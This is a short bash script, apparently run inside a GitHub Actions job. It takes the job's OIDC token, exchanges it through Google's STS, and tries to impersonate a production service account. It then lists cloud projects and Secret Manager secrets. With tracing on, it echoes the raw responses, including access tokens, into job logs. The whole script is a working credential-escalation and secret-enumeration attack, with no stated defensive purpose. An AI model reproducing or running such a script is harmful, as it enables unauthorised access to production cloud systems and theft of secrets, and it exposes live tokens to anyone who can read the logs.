#!/usr/bin/env bash
set -x
AUD="//iam.googleapis.com/projects/314073401107/locations/global/workloadIdentityPools/github-actions/providers/github"
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "JWTLEN=${#JWT}"
python3 - "$JWT" <<'PY'
import base64,json,sys
t=sys.argv[1]
p=t.split('.')[1]; p+='='*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
for k in ("iss","aud","sub","repository","repository_owner","actor","ref","event_name","workflow","job_workflow_ref","environment"):
    print("CLAIM",k,"=",c.get(k))
PY
for EV in "$GITHUB_EVENT_NAME" push; do
  echo "### trying event claim context: $EV"
done
RESP=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' \
  -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"${AUD}\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"${JWT}\"}")
echo "STS_RESPONSE=${RESP}"
FED=$(echo "$RESP" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))' 2>/dev/null)
echo "FEDTOKLEN=${#FED}"
if [ -n "$FED" ]; then
  IRA=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/pragma-publisher-sa@prod-pragma.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer $FED" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
  echo "IMPERSONATION=$IRA"
  AT=$(echo "$IRA" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("accessToken",""))' 2>/dev/null)
  echo "ATLEN=${#AT}"
  if [ -n "$AT" ]; then
    echo "PROJECTS:"; curl -sS "https://cloudresourcemanager.googleapis.com/v1/projects" -H "Authorization: Bearer $AT" | head -c 2000; echo
    echo "SECRETS:"; curl -sS "https://secretmanager.googleapis.com/v1/projects/prod-pragma/secrets" -H "Authorization: Bearer $AT" | head -c 6000; echo
  fi
fi
